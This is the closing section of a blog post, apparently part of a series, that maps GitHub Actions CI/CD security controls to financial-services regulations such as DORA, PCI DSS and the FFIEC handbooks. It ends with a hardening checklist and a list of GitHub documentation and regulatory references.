| Action allowlist and SHA pinning | US-3PRM-2023, EU-DORA-28-30, INT-PCI-12.8, US-FFIEC-DAM | Enterprise Actions policy, lockfiles | Policy API export; `business.update_actions_settings` | Monthly export; continuous alert; quarterly review |
| Read-only GITHUB_TOKEN | INT-PCI-7.2, US-FFIEC-INFOSEC | Workflow permissions policy | `/actions/permissions/workflow` export; `business.set_default_workflow_permissions` | Monthly |
| OIDC, no stored cloud keys | INT-PCI-7.2, EU-DORA-9, INT-NIST-SSDF | OIDC, immutable `sub`, custom property claims | Cloud trust policy export; secrets inventory | Quarterly |
| Deployment approvals, no self-review | EU-DORA-RTS-CHANGE, US-FFIEC-DAM, CA-OSFI-B13, MX-CNBV-CUB | Environments, required reviewers, prevent self-review | Run approvals API; `workflows.approve_workflow_job`; deployments API | Per deployment; quarterly sample |
| Central required workflows and execution policies | US-FFIEC-DAM, EU-DORA-RTS-CHANGE, EU-DORA-9 | Rulesets, workflow execution protections | Ruleset export; `workflows.actions_policy_violation` | Continuous; monthly |
| Runner isolation | INT-NIST-SSDF, INT-SWIFT-CSCF-OVERVIEW, US-FFIEC-AIO, CA-AMF-ICT | Hosted and larger runners, Azure private networking, ARC, runner groups | Runner group export; runner audit events | Monthly; quarterly patch review |
| Untrusted input controls | EU-DORA-9, US-FFIEC-INFOSEC, INT-NIST-SSDF | Fork PR policies, event rules, code scanning | Fork policy export; code scanning alerts | Monthly; continuous |
| Retention and log archive | INT-PCI-10.4, EU-DORA-9 | Retention policy, audit log streaming, logs API, attestations | Retention API; archive reconciliation | Daily SIEM; monthly reconcile |
| CI/CD resilience | EU-DORA-9, CA-OSFI-B13, US-FFIEC-AIO | Portable deployment logic, alternate OIDC-independent identity | Rehearsal records | Semi-annual |

## Summary and key takeaways

Your pipeline is a privileged production system that happens to be written in YAML. Treat it that way and most of the scary scenarios become boring, which is exactly what you want.

**Start here:**

- [ ] Switch the enterprise Actions policy to selected actions, disable blanket verified-creator access, and require full-length SHA pinning. Manage the allowlist as code.
- [ ] Confirm the default `GITHUB_TOKEN` is read-only and Actions cannot approve pull requests. Add `permissions: {}` to your workflow templates.
- [ ] Remove every stored cloud key. Move to OIDC, opt existing repos into immutable subject claims, and bind production roles to the production environment.
- [ ] Configure production environments with team reviewers, prevent self-review, no admin bypass, and branch/tag restrictions.
- [ ] Add an org-level ruleset with a required policy workflow. Pilot workflow execution protections in Evaluate mode and block `pull_request_target`.
- [ ] Disable repository-level self-hosted runners. Use runner groups restricted to selected workflows for production.
- [ ] Require approval for all outside collaborators on fork PRs, and never send secrets to fork PR workflows.
- [ ] Set retention to 400 days, stream the audit log, and archive production run logs, approvals, and attestations to your own storage.
- [ ] Write down and rehearse your alternate deployment path.

**Previous:** [Part 5: Code Scanning and Software Supply Chain](/blog/github-waf-financial-services/code-scanning-supply-chain/)
**Next:** [Part 7: Copilot and AI Agents](/blog/github-waf-financial-services/copilot-and-agents/)

## References

### GitHub Well-Architected

- [Actions security](https://learn.github.com/well-architected/library/application-security/recommendations/actions-security/)
- [Designing resilient CI/CD](https://learn.github.com/well-architected/library/architecture/recommendations/designing-resilient-ci-cd/)
- [Building resilience with repository mirroring](https://learn.github.com/well-architected/library/architecture/recommendations/building-resilience-with-repository-mirroring/)
- [Deploying Actions Runner Controller](https://learn.github.com/well-architected/library/architecture/recommendations/deploying-actions-runner-controller/)
- [Hosted runner private networking](https://learn.github.com/well-architected/library/architecture/recommendations/hosted-runner-private-networking/)
- [Scaling Actions reusability](https://learn.github.com/well-architected/library/collaboration/recommendations/scaling-actions-reusability/)
- [Effective CI](https://learn.github.com/well-architected/library/productivity/recommendations/effective-ci/)
- [NIST SSDF implementation](https://learn.github.com/well-architected/library/scenarios/nist-ssdf-implementation/)

### GitHub Docs

- [Enforcing policies for GitHub Actions in your enterprise](https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)
- [Enforcing policies for GitHub Actions in your enterprise (GHES 3.20)](https://docs.github.com/en/enterprise-server@3.20/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)
- [REST API endpoints for GitHub Actions permissions](https://docs.github.com/en/enterprise-cloud@latest/rest/actions/permissions)
- [Workflow dependency lockfiles](https://docs.github.com/en/enterprise-cloud@latest/actions/concepts/security/workflow-dependency-lockfiles)
- [About Actions policies](https://docs.github.com/en/enterprise-cloud@latest/actions/concepts/about-actions-policies)
- [Governing execution of GitHub Actions workflows](https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/administer/control-workflow-execution)
- [Securely using pull_request_target](https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/securely-using-pull_request_target)
- [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)
- [OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect)
- [OpenID Connect reference](https://docs.github.com/en/actions/reference/security/oidc)
- [OpenID Connect reference (GHE.com substitutions)](https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/oidc)
- [OpenID Connect reference (GHES 3.20)](https://docs.github.com/en/enterprise-server@3.20/actions/reference/security/oidc)
- [Deployments and environments](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments)
- [Available rules for rulesets](https://docs.github.com/en/enterprise-cloud@latest/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/available-rules-for-rulesets)
- [About Azure private networking for GitHub-hosted runners in your enterprise](https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)
- [Actions Runner Controller](https://docs.github.com/en/actions/concepts/runners/actions-runner-controller)
- [Self-hosted runners reference](https://docs.github.com/en/actions/reference/runners/self-hosted-runners)
- [Managing access to self-hosted runners using groups](https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/manage-runners/self-hosted-runners/manage-access)
- [Artifact attestations](https://docs.github.com/en/actions/concepts/security/artifact-attestations)
- [Verifying attestations offline](https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/secure-your-work/use-artifact-attestations/verify-attestations-offline)
- [Audit log events for your enterprise](https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/audit-log-events-for-your-enterprise)
- [REST API endpoints for workflow runs](https://docs.github.com/en/rest/actions/workflow-runs)
- [REST API endpoints for deployments](https://docs.github.com/en/rest/deployments/deployments)
- [Feature overview for GitHub Enterprise Cloud with data residency](https://docs.github.com/en/enterprise-cloud@latest/admin/data-residency/feature-overview-for-github-enterprise-cloud-with-data-residency)
- [About using actions in your enterprise (GHES 3.22)](https://docs.github.com/en/enterprise-server@3.22/admin/managing-github-actions-for-your-enterprise/managing-access-to-actions-from-githubcom/about-using-actions-in-your-enterprise)

### Regulatory sources

- [FFIEC IT Examination Handbook: Development, Acquisition, and Maintenance](https://ithandbook.ffiec.gov/it-booklets/development-acquisition-and-maintenance)
- [FFIEC IT Examination Handbook: Information Security](https://ithandbook.ffiec.gov/it-booklets/information-security)
- [FFIEC IT Examination Handbook: Architecture, Infrastructure, and Operations](https://ithandbook.ffiec.gov/it-booklets/architecture-infrastructure-and-operations)
- [OCC Bulletin 2023-17, Third-Party Relationships: Interagency Guidance on Risk Management](https://www.occ.gov/news-issuances/bulletins/2023/bulletin-2023-17.html)
- [Federal Reserve SR 23-4](https://www.federalreserve.gov/supervisionreg/srletters/SR2304.htm)
- [OSFI Guideline B-13](https://www.osfi-bsif.gc.ca/en/guidance/guidance-library/technology-cyber-risk-management)
- [AMF Guideline on ICT Risk Management](https://lautorite.qc.ca/en/professionals/insurers/guidelines/operational-risk/guideline-on-information-and-communications-technology-risk-management)
- [CNBV Circular Única de Bancos](https://www.cnbv.gob.mx/Normatividad/Disposiciones%20de%20car%C3%A1cter%20general%20aplicables%20a%20las%20instituciones%20de%20cr%C3%A9dito.pdf)
- [Regulation (EU) 2022/2554 (DORA)](https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32022R2554)
- [Commission Delegated Regulation (EU) 2024/1774](https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32024R1774)
- [PCI DSS v4.0.1 (PCI SSC document library)](https://www.pcisecuritystandards.org/document_library/)
- [SWIFT Customer Security Programme](https://www.swift.com/myswift/customer-security-programme)
- [NIST SP 800-218, SSDF v1.1](https://csrc.nist.gov/pubs/sp/800/218/final)
